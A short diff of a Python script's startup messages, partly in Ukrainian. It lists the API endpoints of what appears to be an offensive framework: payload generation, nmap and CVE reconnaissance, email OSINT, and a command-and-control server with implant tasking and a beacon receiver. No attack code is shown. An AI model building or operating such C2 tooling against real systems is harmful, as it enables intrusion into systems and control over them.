@@ -1194,8 +1243,8 @@ if __name__ == '__main__':
     print("  POST /api/generate_payload")
     print("  POST /api/run_recon (типи: port_scan_basic, port_scan_nmap_standard, port_scan_nmap_cve_basic, osint_email_search)")
     print("  GET  /api/c2/implants")
-    print("  POST /api/c2/task")
-    print("  POST /api/c2/beacon_receiver  <-- NEW C2 BEACON ENDPOINT")
+    print("  POST /api/c2/task  (додано параметр 'queue_task': true/false)")
+    print("  POST /api/c2/beacon_receiver")
     print("  GET  /api/operational_data")
     print("  POST /api/framework_rules")
     print("Переконайтеся, що 'nmap' встановлено та доступно в PATH для використання 'port_scan_nmap_standard' та 'port_scan_nmap_cve_basic'.")
